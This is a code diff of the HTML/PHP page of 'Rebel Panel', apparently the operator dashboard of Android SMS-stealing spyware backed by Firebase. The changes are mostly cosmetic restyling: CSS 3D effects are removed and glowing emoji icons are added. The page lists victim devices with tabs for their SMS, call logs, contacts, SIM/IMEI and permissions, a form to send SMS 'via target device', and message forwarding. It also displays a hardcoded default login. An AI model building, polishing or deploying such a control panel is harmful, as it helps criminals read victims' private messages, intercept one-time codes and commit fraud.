@@ -11,10 +11,9 @@ header('Content-Type: text/html; charset=UTF-8');
   <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
   <style>
-    :root{--bg:#050508;--surface:#0d0d14;--card:#12121c;--border:#2a2a3a;--accent:#ff3c3c;--accent2:#ff9500;--text:#e8e8f0;--muted:#6b6b88;--success:#00ff9d;--error:#ff4466;--glow:rgba(255,60,60,0.45);--perspective:1200px}
+    :root{--bg:#050508;--surface:#0d0d14;--card:#12121c;--border:#2a2a3a;--accent:#ff3c3c;--accent2:#ff9500;--text:#e8e8f0;--muted:#6b6b88;--success:#00ff9d;--error:#ff4466;--glow:rgba(255,60,60,0.45);--icon-glow:rgba(255,60,60,0.7)}
     *{margin:0;padding:0;box-sizing:border-box}
-    html{perspective:var(--perspective)}
-    body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;transform-style:preserve-3d}
+    body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
     #bg3d{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none}
     #particleCanvas{position:absolute;inset:0;width:100%;height:100%;opacity:0.55}
     .orb{position:absolute;border-radius:50%;filter:blur(80px);opacity:0.35;animation:orbFloat 12s ease-in-out infinite}
@@ -22,14 +21,33 @@ header('Content-Type: text/html; charset=UTF-8');
     .orb2{width:380px;height:380px;background:radial-gradient(circle,#ff9500,transparent 70%);bottom:-15%;right:-8%;animation-delay:-4s}
     .orb3{width:300px;height:300px;background:radial-gradient(circle,#7b2fff,transparent 70%);top:40%;left:55%;animation-delay:-7s;opacity:0.2}
     @keyframes orbFloat{0%,100%{transform:translate3d(0,0,0) scale(1)}50%{transform:translate3d(30px,-25px,50px) scale(1.08)}}
-    body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(255,60,60,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(255,60,60,0.04) 1px,transparent 1px);background-size:44px 44px;pointer-events:none;z-index:0;transform:translateZ(-100px) scale(1.1)}
-    .wrapper{position:relative;z-index:1;transform-style:preserve-3d}
+    body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(255,60,60,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(255,60,60,0.04) 1px,transparent 1px);background-size:44px 44px;pointer-events:none;z-index:0}
+    .wrapper{position:relative;z-index:1}
+
+    /* ─── 3D GLOWING ICONS (icons only — layout stays flat) ─── */
+    .i3d{display:inline-block;position:relative;font-style:normal;line-height:1;vertical-align:middle;transform-style:preserve-3d;transform:perspective(400px) rotateX(12deg) translateZ(0);filter:drop-shadow(0 3px 4px rgba(0,0,0,0.55)) drop-shadow(0 0 10px var(--icon-glow));text-shadow:0 1px 0 rgba(255,255,255,0.45),0 4px 8px rgba(0,0,0,0.65),0 0 14px var(--icon-glow),0 0 28px var(--icon-glow);animation:iconGlow 2.8s ease-in-out infinite}
+    .i3d-sm{font-size:0.95em}
+    .i3d-lg{font-size:1.55em}
+    .i3d-xl{font-size:2.8em}
+    .i3d-fire{--icon-glow:rgba(255,120,40,0.85)}
+    .i3d-red{--icon-glow:rgba(255,60,60,0.8)}
+    .i3d-green{--icon-glow:rgba(0,255,157,0.75)}
+    .i3d-blue{--icon-glow:rgba(80,160,255,0.8)}
+    .i3d-purple{--icon-glow:rgba(160,90,255,0.8)}
+    .i3d-orange{--icon-glow:rgba(255,149,0,0.85)}
+    .i3d-static{animation:none}
+    .logo-icon-3d{filter:drop-shadow(0 0 8px rgba(255,60,60,0.7)) drop-shadow(0 4px 12px rgba(0,0,0,0.5));animation:logoIconGlow 2.5s ease-in-out infinite}
+    @keyframes iconGlow{0%,100%{transform:perspective(400px) rotateX(12deg) translateY(0) scale(1);filter:drop-shadow(0 3px 4px rgba(0,0,0,0.55)) drop-shadow(0 0 10px var(--icon-glow))}50%{transform:perspective(400px) rotateX(16deg) translateY(-2px) scale(1.08);filter:drop-shadow(0 5px 8px rgba(0,0,0,0.6)) drop-shadow(0 0 18px var(--icon-glow)) drop-shadow(0 0 32px var(--icon-glow))}}
+    @keyframes logoIconGlow{0%,100%{filter:drop-shadow(0 0 6px rgba(255,60,60,0.5)) drop-shadow(0 3px 8px rgba(0,0,0,0.4))}50%{filter:drop-shadow(0 0 16px rgba(255,60,60,0.95)) drop-shadow(0 0 28px rgba(255,60,60,0.45)) drop-shadow(0 4px 12px rgba(0,0,0,0.5))}}
+    .data-tab .i3d{font-size:13px;margin-right:3px}
+    .btn .i3d,.btn-sm .i3d,.btn-fb .i3d{margin-right:5px}
+    .dchip .i3d{font-size:9px;margin-right:2px;animation-duration:3.5s}
 
     /* ─── LOGIN ─── */
-    #loginPage{position:fixed;inset:0;z-index:9999;background:rgba(5,5,8,0.88);backdrop-filter:blur(12px);display:flex;align-items:center;justify-content:center;padding:20px;transform-style:preserve-3d}
+    #loginPage{position:fixed;inset:0;z-index:9999;background:rgba(5,5,8,0.88);backdrop-filter:blur(12px);display:flex;align-items:center;justify-content:center;padding:20px}
     #loginPage.hidden{display:none!important}
-    .login-card{background:linear-gradient(145deg,rgba(22,22,31,0.95),rgba(12,12,18,0.98));border:1px solid rgba(255,60,60,0.2);border-radius:22px;padding:40px 36px;width:100%;max-width:400px;position:relative;overflow:hidden;box-shadow:0 30px 80px rgba(0,0,0,0.7),0 0 40px var(--glow),inset 0 1px 0 rgba(255,255,255,0.06);transform:rotateX(4deg) rotateY(-2deg);transition:transform 0.4s ease,box-shadow 0.4s}
-    .login-card:hover{transform:rotateX(0deg) rotateY(0deg) translateZ(20px);box-shadow:0 40px 100px rgba(0,0,0,0.8),0 0 60px var(--glow)}
+    .login-card{background:linear-gradient(145deg,rgba(22,22,31,0.95),rgba(12,12,18,0.98));border:1px solid rgba(255,60,60,0.2);border-radius:22px;padding:40px 36px;width:100%;max-width:400px;position:relative;overflow:hidden;box-shadow:0 30px 80px rgba(0,0,0,0.7),0 0 40px var(--glow),inset 0 1px 0 rgba(255,255,255,0.06);transition:box-shadow 0.35s ease}
+    .login-card:hover{box-shadow:0 40px 100px rgba(0,0,0,0.8),0 0 60px var(--glow)}
     .login-card::after{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(180deg,var(--accent),var(--accent2));border-radius:22px 0 0 22px}
     .login-logo{display:flex;align-items:center;gap:14px;margin-bottom:28px}
     .login-logo .rebel{font-size:24px;font-weight:800;letter-spacing:-1px}
@@ -52,10 +70,9 @@ header('Content-Type: text/html; charset=UTF-8');
     .btn-sm:hover{transform:translateY(-1px);box-shadow:0 6px 18px rgba(255,60,60,0.4)}
 
     /* ─── HEADER ─── */
-    header{padding:16px 28px;border-bottom:1px solid rgba(255,60,60,0.15);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;background:linear-gradient(180deg,rgba(14,14,22,0.92),rgba(8,8,12,0.88));backdrop-filter:blur(20px);position:sticky;top:0;z-index:100;box-shadow:0 8px 32px rgba(0,0,0,0.5),inset 0 -1px 0 rgba(255,60,60,0.1);transform:translateZ(30px)}
+    header{padding:16px 28px;border-bottom:1px solid rgba(255,60,60,0.15);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;background:linear-gradient(180deg,rgba(14,14,22,0.92),rgba(8,8,12,0.88));backdrop-filter:blur(20px);position:sticky;top:0;z-index:100;box-shadow:0 8px 32px rgba(0,0,0,0.5),inset 0 -1px 0 rgba(255,60,60,0.1)}
     .logo{display:flex;align-items:center;gap:12px}
-    .logo-mark{width:34px;height:34px;filter:drop-shadow(0 0 6px rgba(255,60,60,0.6));animation:logoPulse 2.5s ease-in-out infinite}
-    @keyframes logoPulse{0%,100%{filter:drop-shadow(0 0 4px rgba(255,60,60,0.4))}50%{filter:drop-shadow(0 0 14px rgba(255,60,60,0.9))}}
+    .logo-mark{width:34px;height:34px}
     .logo-text .rebel{font-size:20px;font-weight:800;letter-spacing:-1px;line-height:1}
     .logo-text .rebel em{font-style:normal;color:var(--accent)}
     .logo-text .panel-sub{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:3px}
@@ -66,29 +83,29 @@ header('Content-Type: text/html; charset=UTF-8');
     @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
 
     /* ─── LAYOUT ─── */
-    .main-layout{display:flex;min-height:calc(100vh - 65px);transform-style:preserve-3d;perspective:var(--perspective)}
+    .main-layout{display:flex;min-height:calc(100vh - 65px)}
     .hidden{display:none!important}
 
     /* ─── FIREBASE SWITCHER ─── */
     .fb-switcher{padding:10px 12px;border-bottom:1px solid var(--border);display:flex;flex-direction:column;gap:8px;background:linear-gradient(180deg,rgba(255,60,60,0.04),transparent)}
     .fb-switch-label{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:2px;text-transform:uppercase}
     .fb-switch-tabs{display:flex;flex-wrap:wrap;gap:6px}
-    .fb-tab{padding:8px 12px;border-radius:10px;border:1px solid var(--border);background:var(--surface);color:var(--muted);font-family:'Space Mono',monospace;font-size:9px;cursor:pointer;transition:all 0.25s;transform-style:preserve-3d;position:relative;overflow:hidden}
+    .fb-tab{padding:8px 12px;border-radius:10px;border:1px solid var(--border);background:var(--surface);color:var(--muted);font-family:'Space Mono',monospace;font-size:9px;cursor:pointer;transition:all 0.25s;position:relative;overflow:hidden}
     .fb-tab::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,60,60,0.15),transparent);opacity:0;transition:opacity 0.25s}
-    .fb-tab:hover{border-color:rgba(255,60,60,0.4);color:var(--text);transform:translateY(-2px) translateZ(8px);box-shadow:0 6px 20px rgba(255,60,60,0.15)}
-    .fb-tab.active{border-color:var(--accent);color:#fff;background:linear-gradient(135deg,rgba(255,60,60,0.25),rgba(180,0,0,0.15));box-shadow:0 0 20px var(--glow),0 8px 24px rgba(0,0,0,0.4);transform:translateZ(12px)}
+    .fb-tab:hover{border-color:rgba(255,60,60,0.4);color:var(--text);transform:translateY(-1px);box-shadow:0 4px 16px rgba(255,60,60,0.12)}
+    .fb-tab.active{border-color:var(--accent);color:#fff;background:linear-gradient(135deg,rgba(255,60,60,0.25),rgba(180,0,0,0.15));box-shadow:0 0 20px var(--glow),0 6px 20px rgba(0,0,0,0.35)}
     .fb-tab.active::before{opacity:1}
     .fb-tab-count{display:block;font-size:7px;opacity:0.7;margin-top:2px}
 
     /* ─── SIDEBAR ─── */
-    .sidebar{width:280px;flex-shrink:0;border-right:1px solid rgba(255,60,60,0.12);background:linear-gradient(180deg,rgba(12,12,18,0.92),rgba(8,8,12,0.95));height:calc(100vh - 65px);position:sticky;top:65px;overflow-y:auto;display:flex;flex-direction:column;box-shadow:8px 0 40px rgba(0,0,0,0.4);transform:rotateY(2deg) translateZ(10px);transform-origin:left center}
+    .sidebar{width:280px;flex-shrink:0;border-right:1px solid rgba(255,60,60,0.12);background:linear-gradient(180deg,rgba(12,12,18,0.92),rgba(8,8,12,0.95));height:calc(100vh - 65px);position:sticky;top:65px;overflow-y:auto;display:flex;flex-direction:column;box-shadow:4px 0 24px rgba(0,0,0,0.35)}
     .sidebar::-webkit-scrollbar{width:3px}
     .sidebar::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
     .sidebar-hdr{padding:14px 16px 10px;border-bottom:1px solid var(--border)}
     .sidebar-title{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:10px}
     .sidebar-stats{display:flex;gap:6px}
-    .mini-stat{flex:1;background:linear-gradient(145deg,rgba(18,18,26,0.95),rgba(12,12,18,0.9));border:1px solid var(--border);border-radius:10px;padding:8px;text-align:center;transform:translateZ(5px);box-shadow:0 4px 16px rgba(0,0,0,0.3);transition:transform 0.2s}
-    .mini-stat:hover{transform:translateZ(12px) scale(1.02)}
+    .mini-stat{flex:1;background:linear-gradient(145deg,rgba(18,18,26,0.95),rgba(12,12,18,0.9));border:1px solid var(--border);border-radius:10px;padding:8px;text-align:center;box-shadow:0 4px 16px rgba(0,0,0,0.3);transition:box-shadow 0.2s,border-color 0.2s}
+    .mini-stat:hover{border-color:rgba(255,60,60,0.25);box-shadow:0 4px 20px rgba(255,60,60,0.08)}
     .mini-val{font-size:20px;font-weight:800;line-height:1}
     .mini-val.t{color:var(--accent)}
     .mini-val.on{color:var(--success)}
@@ -98,12 +115,12 @@ header('Content-Type: text/html; charset=UTF-8');
     .sidebar-search input{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:7px 10px;color:var(--text);font-family:'Space Mono',monospace;font-size:10px;outline:none}
     .sidebar-search input:focus{border-color:var(--accent)}
     .dev-list{flex:1;padding:8px}
-    .dev-item{padding:12px;border:1px solid var(--border);border-radius:12px;margin-bottom:8px;cursor:pointer;transition:transform 0.25s ease,box-shadow 0.25s,border-color 0.25s;background:linear-gradient(145deg,rgba(20,20,28,0.9),rgba(14,14,20,0.95));position:relative;overflow:hidden;transform-style:preserve-3d;transform:translateZ(0)}
+    .dev-item{padding:12px;border:1px solid var(--border);border-radius:12px;margin-bottom:8px;cursor:pointer;transition:transform 0.2s ease,box-shadow 0.2s,border-color 0.2s;background:linear-gradient(145deg,rgba(20,20,28,0.9),rgba(14,14,20,0.95));position:relative;overflow:hidden}
     .dev-item::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--muted);border-radius:12px 0 0 12px;transition:all 0.2s}
     .dev-item::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,0.03),transparent);pointer-events:none;border-radius:12px}
-    .dev-item:hover{border-color:rgba(255,60,60,0.4);transform:translateY(-3px) translateZ(16px) rotateX(2deg);box-shadow:0 12px 32px rgba(0,0,0,0.5),0 0 20px rgba(255,60,60,0.1)}
+    .dev-item:hover{border-color:rgba(255,60,60,0.4);transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,0,0,0.4),0 0 16px rgba(255,60,60,0.08)}
     .dev-item:hover::before{background:var(--accent);box-shadow:0 0 12px var(--accent)}
-    .dev-item.active{border-color:var(--accent);background:linear-gradient(145deg,rgba(255,60,60,0.12),rgba(20,20,28,0.95));transform:translateZ(20px);box-shadow:0 0 30px var(--glow),0 12px 40px rgba(0,0,0,0.5)}
+    .dev-item.active{border-color:var(--accent);background:linear-gradient(145deg,rgba(255,60,60,0.12),rgba(20,20,28,0.95));box-shadow:0 0 24px var(--glow),0 8px 28px rgba(0,0,0,0.45)}
     .dev-item.active::before{background:var(--accent);box-shadow:0 0 12px var(--accent)}
     .dev-item.is-online::before{background:var(--success)}
     .dev-item.is-online.active::before{background:var(--success);box-shadow:0 0 8px rgba(0,255,157,0.5)}
@@ -122,11 +139,11 @@ header('Content-Type: text/html; charset=UTF-8');
     .cache-badge{font-family:'Space Mono',monospace;font-size:7px;color:var(--accent2);padding:2px 6px;border:1px solid rgba(255,149,0,0.25);border-radius:6px;margin-left:6px}
     .fetch-ms{font-family:'Space Mono',monospace;font-size:8px;color:var(--success);margin-left:4px}
     .hdr-actions{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
-    .btn-fb{padding:7px 14px;border-radius:100px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-family:'Space Mono',monospace;font-size:9px;cursor:pointer;transition:all 0.25s;transform-style:preserve-3d}
-    .btn-fb:hover{border-color:var(--accent);color:var(--accent);transform:translateZ(8px);box-shadow:0 6px 20px rgba(255,60,60,0.2)}
+    .btn-fb{padding:7px 14px;border-radius:100px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-family:'Space Mono',monospace;font-size:9px;cursor:pointer;transition:all 0.25s}
+    .btn-fb:hover{border-color:var(--accent);color:var(--accent);box-shadow:0 4px 16px rgba(255,60,60,0.15)}
     .btn-switch{border-color:rgba(255,149,0,0.35);background:linear-gradient(135deg,rgba(255,149,0,0.12),rgba(255,60,60,0.08));min-width:130px}
     .fb-dropdown-wrap{position:relative}
-    .fb-drop-menu{position:absolute;top:calc(100% + 8px);right:0;min-width:200px;background:linear-gradient(145deg,rgba(18,18,26,0.98),rgba(10,10,15,0.99));border:1px solid rgba(255,60,60,0.25);border-radius:12px;padding:8px;box-shadow:0 20px 50px rgba(0,0,0,0.6),0 0 30px var(--glow);z-index:200;transform:translateZ(50px)}
+    .fb-drop-menu{position:absolute;top:calc(100% + 8px);right:0;min-width:200px;background:linear-gradient(145deg,rgba(18,18,26,0.98),rgba(10,10,15,0.99));border:1px solid rgba(255,60,60,0.25);border-radius:12px;padding:8px;box-shadow:0 20px 50px rgba(0,0,0,0.6),0 0 30px var(--glow);z-index:200}
     .fb-drop-item{display:block;width:100%;text-align:left;padding:10px 12px;border:none;border-radius:8px;background:transparent;color:var(--text);font-family:'Space Mono',monospace;font-size:10px;cursor:pointer;transition:all 0.2s}
     .fb-drop-item:hover{background:rgba(255,60,60,0.1)}
     .fb-drop-item.active{background:rgba(255,60,60,0.2);color:var(--accent)}
@@ -141,13 +158,13 @@ header('Content-Type: text/html; charset=UTF-8');
     .modal-wide{max-width:560px}
 
     /* ─── MAIN AREA ─── */
-    .main-area{flex:1;overflow-x:hidden;transform:translateZ(20px);transform-style:preserve-3d}
-    .empty-state{display:flex;flex-direction:column;align-items:center;justify-content:center;height:60vh;gap:14px;opacity:0.35}
+    .main-area{flex:1;overflow-x:hidden}
+    .empty-state{display:flex;flex-direction:column;align-items:center;justify-content:center;height:60vh;gap:14px;opacity:0.55}
     .empty-icon{font-size:52px}
     .empty-txt{font-family:'Space Mono',monospace;font-size:11px;color:var(--muted);letter-spacing:2px}
 
     /* ─── DEVICE DETAIL ─── */
-    .dev-hero{padding:22px 28px;border-bottom:1px solid rgba(255,60,60,0.15);background:linear-gradient(135deg,rgba(255,60,60,0.08) 0%,transparent 60%);position:relative;overflow:hidden;box-shadow:inset 0 -20px 60px rgba(255,60,60,0.03);transform:translateZ(15px)}
+    .dev-hero{padding:22px 28px;border-bottom:1px solid rgba(255,60,60,0.15);background:linear-gradient(135deg,rgba(255,60,60,0.08) 0%,transparent 60%);position:relative;overflow:hidden;box-shadow:inset 0 -20px 60px rgba(255,60,60,0.03)}
     .dev-hero::after{content:'';position:absolute;top:-40%;right:-5%;width:220px;height:220px;border-radius:50%;background:radial-gradient(circle,rgba(255,60,60,0.05),transparent 70%);pointer-events:none}
     .hero-top{display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:12px;margin-bottom:16px}
     .hero-name{font-size:22px;font-weight:800}
@@ -182,7 +199,7 @@ header('Content-Type: text/html; charset=UTF-8');
     .dm-toolbar{display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap;align-items:center}
     .dm-search{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:8px 14px;color:var(--text);font-family:'Space Mono',monospace;font-size:11px;outline:none;width:100%;max-width:280px}
     .dm-search:focus{border-color:var(--accent)}
-    .tbl-wrap{border:1px solid var(--border);border-radius:12px;overflow:hidden;overflow-x:auto;box-shadow:0 8px 32px rgba(0,0,0,0.35);transform:translateZ(8px)}
+    .tbl-wrap{border:1px solid var(--border);border-radius:12px;overflow:hidden;overflow-x:auto;box-shadow:0 8px 32px rgba(0,0,0,0.35)}
     .tbl{width:100%;border-collapse:collapse;min-width:450px}
     .tbl thead tr{background:rgba(255,60,60,0.05)}
     .tbl th{padding:10px 14px;font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:1.5px;text-align:left;white-space:nowrap;text-transform:uppercase;border-bottom:1px solid var(--border)}
@@ -214,7 +231,7 @@ header('Content-Type: text/html; charset=UTF-8');
     .perm-name{font-family:'Space Mono',monospace;font-size:9px;color:var(--text);letter-spacing:0.5px;text-transform:uppercase}
 
     /* ─── FORM ─── */
-    .config-card{background:linear-gradient(145deg,rgba(22,22,31,0.95),rgba(14,14,20,0.98));border:1px solid rgba(255,60,60,0.15);border-radius:14px;padding:24px;position:relative;overflow:hidden;max-width:520px;margin:14px 0;box-shadow:0 12px 40px rgba(0,0,0,0.4),inset 0 1px 0 rgba(255,255,255,0.04);transform:translateZ(10px)}
+    .config-card{background:linear-gradient(145deg,rgba(22,22,31,0.95),rgba(14,14,20,0.98));border:1px solid rgba(255,60,60,0.15);border-radius:14px;padding:24px;position:relative;overflow:hidden;max-width:520px;margin:14px 0;box-shadow:0 12px 40px rgba(0,0,0,0.4),inset 0 1px 0 rgba(255,255,255,0.04)}
     .config-card::after{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(180deg,var(--accent),var(--accent2));border-radius:14px 0 0 14px}
     .input-group{display:flex;flex-direction:column;gap:12px;margin-bottom:16px}
     textarea{resize:vertical;min-height:80px}
@@ -240,10 +257,10 @@ header('Content-Type: text/html; charset=UTF-8');
     }
 
     /* SMS Modal */
-    .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.75);z-index:9990;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(8px);perspective:var(--perspective)}
+    .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.75);z-index:9990;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(8px)}
     .modal-overlay.hidden{display:none!important}
-    .modal-box{background:linear-gradient(145deg,rgba(22,22,31,0.98),rgba(12,12,18,0.99));border:1px solid rgba(255,60,60,0.2);border-radius:16px;padding:24px;width:100%;max-width:500px;position:relative;overflow:hidden;box-shadow:0 30px 80px rgba(0,0,0,0.7),0 0 50px var(--glow);transform:rotateX(2deg) translateZ(40px);animation:modalIn 0.35s ease}
-    @keyframes modalIn{from{opacity:0;transform:rotateX(8deg) translateZ(-50px) scale(0.95)}to{opacity:1;transform:rotateX(2deg) translateZ(40px) scale(1)}}
+    .modal-box{background:linear-gradient(145deg,rgba(22,22,31,0.98),rgba(12,12,18,0.99));border:1px solid rgba(255,60,60,0.2);border-radius:16px;padding:24px;width:100%;max-width:500px;position:relative;overflow:hidden;box-shadow:0 30px 80px rgba(0,0,0,0.7),0 0 50px var(--glow);animation:modalIn 0.3s ease}
+    @keyframes modalIn{from{opacity:0;transform:scale(0.96) translateY(8px)}to{opacity:1;transform:scale(1) translateY(0)}}
     .modal-box::after{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2))}
     .modal-from{font-family:'Space Mono',monospace;font-size:11px;color:var(--accent2);margin-bottom:4px;letter-spacing:1px}
     .modal-date{font-family:'Space Mono',monospace;font-size:10px;color:var(--muted);margin-bottom:14px}
@@ -269,7 +286,7 @@ header('Content-Type: text/html; charset=UTF-8');
 <div id="loginPage">
   <div class="login-card">
     <div class="login-logo">
-      <svg width="34" height="34" viewBox="0 0 38 38" fill="none" style="filter:drop-shadow(0 0 6px rgba(255,60,60,0.6))"><polygon points="19,2 36,10 36,28 19,36 2,28 2,10" fill="rgba(255,60,60,0.12)" stroke="#ff3c3c" stroke-width="1.5"/><text x="19" y="25" text-anchor="middle" font-family="'Syne',sans-serif" font-weight="800" font-size="16" fill="#ff3c3c">R</text></svg>
+      <svg class="logo-icon-3d" width="34" height="34" viewBox="0 0 38 38" fill="none"><polygon points="19,2 36,10 36,28 19,36 2,28 2,10" fill="rgba(255,60,60,0.12)" stroke="#ff3c3c" stroke-width="1.5"/><text x="19" y="25" text-anchor="middle" font-family="'Syne',sans-serif" font-weight="800" font-size="16" fill="#ff3c3c">R</text></svg>
       <div><div class="rebel"><em>Rebel</em> Panel</div><div class="panel-sub">REAL-TIME DASHBOARD</div></div>
     </div>
     <h2>Admin <span>Login</span></h2>
@@ -280,7 +297,7 @@ header('Content-Type: text/html; charset=UTF-8');
       <div><label>Password</label><input type="password" id="loginPass" placeholder="••••••••" autocomplete="current-password"/></div>
     </div>
     <div class="remember-row"><input type="checkbox" id="rememberMe"/><label for="rememberMe">Remember me</label></div>
-    <button class="btn" onclick="doLogin()">🔐 Login</button>
+    <button class="btn" onclick="doLogin()"><span class="i3d i3d-purple i3d-sm">🔐</span> Login</button>
     <div class="login-hint">Default: admin / rebel2024</div>
   </div>
 </div>
@@ -289,15 +306,15 @@ header('Content-Type: text/html; charset=UTF-8');
 <!-- HEADER -->
 <header>
   <div class="logo">
-    <svg class="logo-mark" viewBox="0 0 38 38" fill="none"><polygon points="19,2 36,10 36,28 19,36 2,28 2,10" fill="rgba(255,60,60,0.12)" stroke="#ff3c3c" stroke-width="1.5"/><text x="19" y="25" text-anchor="middle" font-family="'Syne',sans-serif" font-weight="800" font-size="16" fill="#ff3c3c">R</text></svg>
+    <svg class="logo-mark logo-icon-3d" viewBox="0 0 38 38" fill="none"><polygon points="19,2 36,10 36,28 19,36 2,28 2,10" fill="rgba(255,60,60,0.12)" stroke="#ff3c3c" stroke-width="1.5"/><text x="19" y="25" text-anchor="middle" font-family="'Syne',sans-serif" font-weight="800" font-size="16" fill="#ff3c3c">R</text></svg>
     <div class="logo-text"><div class="rebel"><em>Rebel</em> Panel</div><div class="panel-sub">Real-Time Dashboard</div></div>
   </div>
   <div class="hdr-actions">
     <div class="fb-dropdown-wrap">
-      <button class="btn-fb btn-switch" onclick="toggleFbDropdown(event)">⇄ <span id="activeFbShort">—</span> ▾</button>
+      <button class="btn-fb btn-switch" onclick="toggleFbDropdown(event)"><span class="i3d i3d-blue i3d-sm i3d-static">⇄</span> <span id="activeFbShort">—</span> ▾</button>
       <div class="fb-drop-menu hidden" id="fbDropMenu"></div>
     </div>
-    <button class="btn-fb" onclick="openFirebaseModal()">🔥 Manage <span id="fbCount">0</span></button>
+    <button class="btn-fb" onclick="openFirebaseModal()"><span class="i3d i3d-fire i3d-sm">🔥</span> Manage <span id="fbCount">0</span></button>
     <div id="statusPill" class="status-pill"><div class="status-dot"></div><span id="statusText">Connecting...</span></div>
   </div>
 </header>
@@ -308,7 +325,7 @@ header('Content-Type: text/html; charset=UTF-8');
   <!-- SIDEBAR -->
   <div class="sidebar">
     <div class="fb-switcher" id="fbSwitcherWrap">
-      <div class="fb-switch-label">🔥 Switch Firebase Project</div>
+      <div class="fb-switch-label"><span class="i3d i3d-fire i3d-sm">🔥</span> Switch Firebase Project</div>
       <div class="fb-switch-tabs" id="fbSwitcher"></div>
     </div>
     <div class="sidebar-hdr">
@@ -323,7 +340,7 @@ header('Content-Type: text/html; charset=UTF-8');
       <input placeholder="Search devices..." id="devSearch" oninput="renderSidebar()" autocomplete="off"/>
     </div>
     <div class="dev-list" id="devList">
-      <div class="dev-empty">📡 No devices connected</div>
+      <div class="dev-empty"><span class="i3d i3d-blue i3d-lg">📡</span><br>No devices connected</div>
     </div>
   </div>
 
@@ -331,7 +348,7 @@ header('Content-Type: text/html; charset=UTF-8');
   <div class="main-area">
     <!-- EMPTY STATE -->
     <div class="empty-state" id="emptyState">
-      <div class="empty-icon">📡</div>
+      <div class="empty-icon"><span class="i3d i3d-blue i3d-xl">📡</span></div>
       <div class="empty-txt">Select a device to view data</div>
     </div>
 
@@ -359,13 +376,13 @@ header('Content-Type: text/html; charset=UTF-8');
 
       <!-- DATA TABS -->
       <div class="data-tabs">
-        <button class="data-tab active" onclick="switchDataTab('sms',this)">💬 SMS <span class="tab-badge" id="tc-sms">0</span></button>
-        <button class="data-tab" onclick="switchDataTab('calls',this)">📞 Calls <span class="tab-badge" id="tc-calls">0</span></button>
-        <button class="data-tab" onclick="switchDataTab('contacts',this)">👥 Contacts <span class="tab-badge" id="tc-contacts">0</span></button>
-        <button class="data-tab" onclick="switchDataTab('sim',this)">📶 SIM / IMEI</button>
-        <button class="data-tab" onclick="switchDataTab('perms',this)">🔐 Permissions</button>
-        <button class="data-tab" onclick="switchDataTab('sendsms',this)">📤 Send SMS</button>
-        <button class="data-tab" onclick="switchDataTab('forward',this)">↗️ Forwarding</button>
+        <button class="data-tab active" onclick="switchDataTab('sms',this)"><span class="i3d i3d-green">💬</span> SMS <span class="tab-badge" id="tc-sms">0</span></button>
+        <button class="data-tab" onclick="switchDataTab('calls',this)"><span class="i3d i3d-blue">📞</span> Calls <span class="tab-badge" id="tc-calls">0</span></button>
+        <button class="data-tab" onclick="switchDataTab('contacts',this)"><span class="i3d i3d-purple">👥</span> Contacts <span class="tab-badge" id="tc-contacts">0</span></button>
+        <button class="data-tab" onclick="switchDataTab('sim',this)"><span class="i3d i3d-orange">📶</span> SIM / IMEI</button>
+        <button class="data-tab" onclick="switchDataTab('perms',this)"><span class="i3d i3d-red">🔐</span> Permissions</button>
+        <button class="data-tab" onclick="switchDataTab('sendsms',this)"><span class="i3d i3d-green">📤</span> Send SMS</button>
+        <button class="data-tab" onclick="switchDataTab('forward',this)"><span class="i3d i3d-fire">↗️</span> Forwarding</button>
       </div>
 
       <!-- SMS -->
@@ -376,7 +393,7 @@ header('Content-Type: text/html; charset=UTF-8');
         </div>
         <div class="tbl-wrap"><table class="tbl"><thead><tr><th>#</th><th>Number</th><th>Message</th><th>Date</th><th>Type</th></tr></thead>
         <tbody id="smsTbody"><tr><td colspan="5" class="tbl-empty">No SMS data</td></tr></tbody></table></div>
-        <div id="smsEmpty" class="tbl-empty" style="display:none">📭 No SMS data. Grant READ_SMS on device.</div>
+        <div id="smsEmpty" class="tbl-empty" style="display:none"><span class="i3d i3d-orange">📭</span> No SMS data. Grant READ_SMS on device.</div>
       </div>
 
       <!-- CALLS -->
@@ -417,10 +434,10 @@ header('Content-Type: text/html; charset=UTF-8');
         <p style="color:var(--muted);font-size:12px;margin-bottom:0">Send message via target device</p>
         <div class="config-card">
           <div class="input-group">
-            <div><label>📞 To Number</label><input type="tel" id="sendTo" placeholder="+919876543210"/></div>
-            <div><label>💬 Message</label><textarea id="sendMsg" placeholder="Type message here..."></textarea></div>
